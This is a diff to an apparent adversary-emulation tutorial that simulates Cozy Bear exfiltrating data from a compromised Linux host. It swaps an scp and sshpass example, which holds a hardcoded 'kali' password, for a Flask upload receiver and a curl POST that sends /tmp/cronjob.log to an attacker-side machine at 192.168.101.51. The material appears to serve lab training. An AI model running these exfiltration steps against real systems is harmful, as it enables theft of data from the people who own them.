@@ -118,21 +118,37 @@ cat /tmp/cronjob.log
 ```
 ### 12. Now we will demonstrate data exfiltration from a compromised Linux system, simulating how Cozy Bear could extract sensitive information after gaining access to a target. 
 
-Here's how to securely transfer a file using scp:
+Data Exfiltration with HTTP POST Request
 
-Make sure that the remote machine has an SSH server running and that you have the necessary credentials (username and password or key pair) to access it.
-
-Use the scp command on the local machine to transfer the file. Replace <remote_user>, <remote_ip>, and <remote_directory> with the appropriate values for your setup:
+Set up a listener on the remote machine to receive the file. You can use a simple Python HTTP server for this purpose. Install Flask (pip install flask) and create a Python script called receiver.py:
 
 ```
-scp /tmp/cronjob.log kali@192.168.101.51:/tmp/received_cronjob.log
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    with open('received_data.txt', 'wb') as f:
+        f.write(request.data)
+    return "Data received and saved", 200
+
+if __name__ == '__main__':
+    app.run(host='192.168.101.51', port=8080)
 ```
 
-sshpass -p 'kali' scp /tmp/cronjob.log kali@192.168.101.51:/tmp/received_cronjob.log
+This script creates a simple HTTP server that listens for POST requests on the /upload endpoint and saves the received data to a file called received_data.txt.
 
+Run the script on the remote machine:
+
+```
+python receiver.py
+```
+
+On the target machine, use curl to send an HTTP POST request with the file contents:
+
+```
 curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@/tmp/cronjob.log" http://192.168.101.51:8080/upload
+```
 
-
-For example, if the remote user is user1, the remote IP is 192.168.101.51, and you want to save the file in the /home/user1 directory:
-
-The scp command will prompt you for the password if you're using password-based authentication or use the appropriate key pair if you're using key-based authentication. After successful authentication, the file will be securely transferred to the remote machine.
+This will send the file as a binary stream in an HTTP POST request to the remote server, which will save the received data to a file. Note that this method is less secure than using scp, as the data is transmitted unencrypted.
